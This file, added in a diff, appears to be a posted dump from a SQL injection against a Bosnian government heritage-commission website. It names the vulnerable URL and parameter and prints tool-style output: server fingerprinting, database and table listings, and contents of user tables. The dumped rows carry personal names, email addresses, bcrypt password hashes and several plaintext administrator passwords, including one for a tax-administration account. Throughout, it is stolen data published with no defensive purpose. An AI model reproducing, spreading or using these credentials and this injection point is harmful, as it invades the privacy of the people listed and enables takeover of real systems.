@@ -1,0 +1,346 @@
+.gov Government 	 
+
+.ba Bosnia And Herzegovina
+
+Bosnia and Herzegovina Commission to Preserve National Monuments
+
+http://old.kons.gov.ba/main.php?id_struct=50&lang=4&action=view&id=2559
+
+the back-end DBMS is MySQL
+web server operating system: Linux
+web application technology: Plesk, Apache
+the back-end DBMS: MySQL >= 5.0.12
+
+available databases [6]:
+[+] information_schema
+[+] kons_spomenici
+[+] test_fpu
+[+] test_profin
+[+] test_spain
+[+] test_st2015
+
+Database: test_spain
+[87 tables]
++----------------------------------------------+
+| kukjq_akeeba_common                          |
+| kukjq_assets                                 |
+| kukjq_associations                           |
+| kukjq_banner_clients                         |
+| kukjq_banner_tracks                          |
+| kukjq_banners                                |
+| kukjq_breezingforms                          |
+| kukjq_categories                             |
+| kukjq_contact_details                        |
+| kukjq_content                                |
+| kukjq_content_frontpage                      |
+| kukjq_content_rating                         |
+| kukjq_content_types                          |
+| kukjq_contentitem_tag_map                    |
+| kukjq_core_log_searches                      |
+| kukjq_extensions                             |
+| kukjq_facileforms_compmenus                  |
+| kukjq_facileforms_config                     |
+| kukjq_facileforms_elements                   |
+| kukjq_facileforms_forms                      |
+| kukjq_facileforms_integrator_criteria_fixed  |
+| kukjq_facileforms_integrator_criteria_form   |
+| kukjq_facileforms_integrator_criteria_joomla |
+| kukjq_facileforms_integrator_items           |
+| kukjq_facileforms_integrator_rules           |
+| kukjq_facileforms_packages                   |
+| kukjq_facileforms_pieces                     |
+| kukjq_facileforms_records                    |
+| kukjq_facileforms_scripts                    |
+| kukjq_facileforms_subrecords                 |
+| kukjq_finder_filters                         |
+| kukjq_finder_links                           |
+| kukjq_finder_links_terms0                    |
+| kukjq_finder_links_terms1                    |
+| kukjq_finder_links_terms2                    |
+| kukjq_finder_links_terms3                    |
+| kukjq_finder_links_terms4                    |
+| kukjq_finder_links_terms5                    |
+| kukjq_finder_links_terms6                    |
+| kukjq_finder_links_terms7                    |
+| kukjq_finder_links_terms8                    |
+| kukjq_finder_links_terms9                    |
+| kukjq_finder_links_termsa                    |
+| kukjq_finder_links_termsb                    |
+| kukjq_finder_links_termsc                    |
+| kukjq_finder_links_termsd                    |
+| kukjq_finder_links_termse                    |
+| kukjq_finder_links_termsf                    |
+| kukjq_finder_taxonomy                        |
+| kukjq_finder_taxonomy_map                    |
+| kukjq_finder_terms                           |
+| kukjq_finder_terms_common                    |
+| kukjq_finder_tokens                          |
+| kukjq_finder_tokens_aggregate                |
+| kukjq_finder_types                           |
+| kukjq_languages                              |
+| kukjq_menu                                   |
+| kukjq_menu_types                             |
+| kukjq_messages                               |
+| kukjq_messages_cfg                           |
+| kukjq_modules                                |
+| kukjq_modules_menu                           |
+| kukjq_newsfeeds                              |
+| kukjq_overrider                              |
+| kukjq_postinstall_messages                   |
+| kukjq_redirect_links                         |
+| kukjq_rokcandy                               |
+| kukjq_rokcommon_configs                      |
+| kukjq_roksprocket_items                      |
+| kukjq_schemas                                |
+| kukjq_session                                |
+| kukjq_tags                                   |
+| kukjq_template_styles                        |
+| kukjq_ucm_base                               |
+| kukjq_ucm_content                            |
+| kukjq_ucm_history                            |
+| kukjq_update_sites                           |
+| kukjq_update_sites_extensions                |
+| kukjq_updates                                |
+| kukjq_user_keys                              |
+| kukjq_user_notes                             |
+| kukjq_user_profiles                          |
+| kukjq_user_usergroup_map                     |
+| kukjq_usergroups                             |
+| kukjq_users                                  |
+| kukjq_viewlevels                             |
+| kukjq_weblinks                               |
++----------------------------------------------+
+
+Database: test_spain
+Table: kukjq_users
+[2 entries]
++--------------+----------+-------------------------------+--------------------------------------------------------------+
+| name         | username | email                         | password                                                     |
++--------------+----------+-------------------------------+--------------------------------------------------------------+
+| Oliver Mader | oliver   | oliver.mader@kanzlei-mader.de | $2y$10$a5j.GVtn1xbKo1BHXfD8vOhyTpbSc28Y7UQu8HkK1xNUCPEd/bYlm |
+| Super User   | arnold   | s.dedic@europronet.ba         | $2y$10$FnHFr9yc2UDTVCYNndN3we1o60C2tOmpGqEFgUxNaUGQLL1Wged1a |
++--------------+----------+-------------------------------+--------------------------------------------------------------+
+
+Database: test_st2015
+[116 tables]
++----------------------------------------------+
+| wracH_admintools_acl                         |
+| wracH_admintools_adminiplist                 |
+| wracH_admintools_badwords                    |
+| wracH_admintools_cookies                     |
+| wracH_admintools_customperms                 |
+| wracH_admintools_filescache                  |
+| wracH_admintools_ipautoban                   |
+| wracH_admintools_ipautobanhistory            |
+| wracH_admintools_ipblock                     |
+| wracH_admintools_log                         |
+| wracH_admintools_profiles                    |
+| wracH_admintools_redirects                   |
+| wracH_admintools_scanalerts                  |
+| wracH_admintools_scans                       |
+| wracH_admintools_storage                     |
+| wracH_admintools_wafblacklists               |
+| wracH_admintools_wafexceptions               |
+| wracH_admintools_waftemplates                |
+| wracH_akeeba_common                          |
+| wracH_assets                                 |
+| wracH_associations                           |
+| wracH_banner_clients                         |
+| wracH_banner_tracks                          |
+| wracH_banners                                |
+| wracH_breezingforms                          |
+| wracH_categories                             |
+| wracH_contact_details                        |
+| wracH_content                                |
+| wracH_content_frontpage                      |
+| wracH_content_rating                         |
+| wracH_content_types                          |
+| wracH_contentitem_tag_map                    |
+| wracH_core_log_searches                      |
+| wracH_extensions                             |
+| wracH_facileforms_compmenus                  |
+| wracH_facileforms_config                     |
+| wracH_facileforms_elements                   |
+| wracH_facileforms_forms                      |
+| wracH_facileforms_integrator_criteria_fixed  |
+| wracH_facileforms_integrator_criteria_form   |
+| wracH_facileforms_integrator_criteria_joomla |
+| wracH_facileforms_integrator_items           |
+| wracH_facileforms_integrator_rules           |
+| wracH_facileforms_packages                   |
+| wracH_facileforms_pieces                     |
+| wracH_facileforms_records                    |
+| wracH_facileforms_scripts                    |
+| wracH_facileforms_subrecords                 |
+| wracH_finder_filters                         |
+| wracH_finder_links                           |
+| wracH_finder_links_terms0                    |
+| wracH_finder_links_terms1                    |
+| wracH_finder_links_terms2                    |
+| wracH_finder_links_terms3                    |
+| wracH_finder_links_terms4                    |
+| wracH_finder_links_terms5                    |
+| wracH_finder_links_terms6                    |
+| wracH_finder_links_terms7                    |
+| wracH_finder_links_terms8                    |
+| wracH_finder_links_terms9                    |
+| wracH_finder_links_termsa                    |
+| wracH_finder_links_termsb                    |
+| wracH_finder_links_termsc                    |
+| wracH_finder_links_termsd                    |
+| wracH_finder_links_termse                    |
+| wracH_finder_links_termsf                    |
+| wracH_finder_taxonomy                        |
+| wracH_finder_taxonomy_map                    |
+| wracH_finder_terms                           |
+| wracH_finder_terms_common                    |
+| wracH_finder_tokens                          |
+| wracH_finder_tokens_aggregate                |
+| wracH_finder_types                           |
+| wracH_languages                              |
+| wracH_menu                                   |
+| wracH_menu_types                             |
+| wracH_messages                               |
+| wracH_messages_cfg                           |
+| wracH_modules                                |
+| wracH_modules_menu                           |
+| wracH_newsfeeds                              |
+| wracH_overrider                              |
+| wracH_postinstall_messages                   |
+| wracH_redirect_links                         |
+| wracH_rokcommon_configs                      |
+| wracH_rokgallery_file_loves                  |
+| wracH_rokgallery_file_tags                   |
+| wracH_rokgallery_file_views                  |
+| wracH_rokgallery_files                       |
+| wracH_rokgallery_files_index                 |
+| wracH_rokgallery_filters                     |
+| wracH_rokgallery_galleries                   |
+| wracH_rokgallery_jobs                        |
+| wracH_rokgallery_profiles                    |
+| wracH_rokgallery_schema_version              |
+| wracH_rokgallery_slice_tags                  |
+| wracH_rokgallery_slices                      |
+| wracH_rokgallery_slices_index                |
+| wracH_roksprocket_items                      |
+| wracH_schemas                                |
+| wracH_session                                |
+| wracH_tags                                   |
+| wracH_template_styles                        |
+| wracH_ucm_base                               |
+| wracH_ucm_content                            |
+| wracH_ucm_history                            |
+| wracH_update_sites                           |
+| wracH_update_sites_extensions                |
+| wracH_updates                                |
+| wracH_user_keys                              |
+| wracH_user_notes                             |
+| wracH_user_profiles                          |
+| wracH_user_usergroup_map                     |
+| wracH_usergroups                             |
+| wracH_users                                  |
+| wracH_viewlevels                             |
++----------------------------------------------+
+
+Database: test_st2015
+Table: wracH_users
+[2 entries]
++------------+-----------+-----------------------+--------------------------------------------------------------+
+| name       | username  | email                 | password                                                     |
++------------+-----------+-----------------------+--------------------------------------------------------------+
+| sporttime  | SportTime | s.gusic@europronet.ba | $2y$10$Gi03TiW1fNutNpRQJDNgjO6nuGFdC.t5BRKiO6n2gpjlKGP/GsA6u |
+| Super User | tito      | s.dedic@europronet.ba | $2y$10$8Rx3VnIc0WpSRP91aztrwOutGjiIM5/TSauro9OKbwDNsIfKNTc0G |
++------------+-----------+-----------------------+--------------------------------------------------------------+
+
+Database: test_fpu
+[20 tables]
++--------------------+
+| arhiva             |
+| arhivafaq          |
+| autori             |
+| faq                |
+| forumvijesti       |
+| image_img          |
+| izvori             |
+| kategorije         |
+| qub3_queries_que   |
+| qub3_relations_rel |
+| qub3_settings_set  |
+| slike              |
+| tbl_admin_log      |
+| tbl_admini         |
+| tbl_file           |
+| tbl_kategorije     |
+| tbl_vijest         |
+| tbl_vijest_file    |
+| tbl_vijest_slika   |
+| vijesti            |
++--------------------+
+
+Database: test_fpu
+Table: tbl_admini
+[1 entry]
++--------------------------------+-----------+----------+
+| ime                            | username  | password |
++--------------------------------+-----------+----------+
+| Porezna uprava - Administrator | pufbih_ba | Pu2f43   |
++--------------------------------+-----------+----------+
+
+Database: test_profin
+[17 tables]
++----------------------------+
+| image_img                  |
+| tbl_admin_log              |
+| tbl_admini                 |
+| tbl_berzni_komentar        |
+| tbl_file                   |
+| tbl_finansijski_izvjestaji |
+| tbl_godine                 |
+| tbl_graf_1                 |
+| tbl_graf_2                 |
+| tbl_kategorije             |
+| tbl_kategorije_2           |
+| tbl_nvi                    |
+| tbl_portfolio              |
+| tbl_titles                 |
+| tbl_vijest                 |
+| tbl_vijest_file            |
+| tbl_vijest_slika           |
++----------------------------+
+
+Database: test_profin
+Table: tbl_admini
+[1 entry]
++----------+----------+
+| username | password |
++----------+----------+
+| prof-in  | 33prof00 |
++----------+----------+
+
+Database: kons_spomenici
+[23 tables]
++------------------------+
+| hidden_tbl_dirs        |
+| hidden_tbl_kat         |
+| hidden_tbl_scripts     |
+| hidden_tbl_vijesti_kat |
+| tbl_bios               |
+| tbl_galerija_spomenika |
+| tbl_jezici             |
+| tbl_scripts            |
+| tbl_slike              |
+| tbl_slike_kat          |
+| tbl_struktura          |
+| tbl_textovi            |
+| tbl_vijesti            |
+| tblbios                |
+| tblgalerija            |
+| tblgalerijaopsta       |
+| tblgradovi             |
+| tblizbornik            |
+| tbllang                |
+| tblrazrada             |
+| tblspomenici           |
+| tbltextovi             |
+| tblvijesti             |
++------------------------+
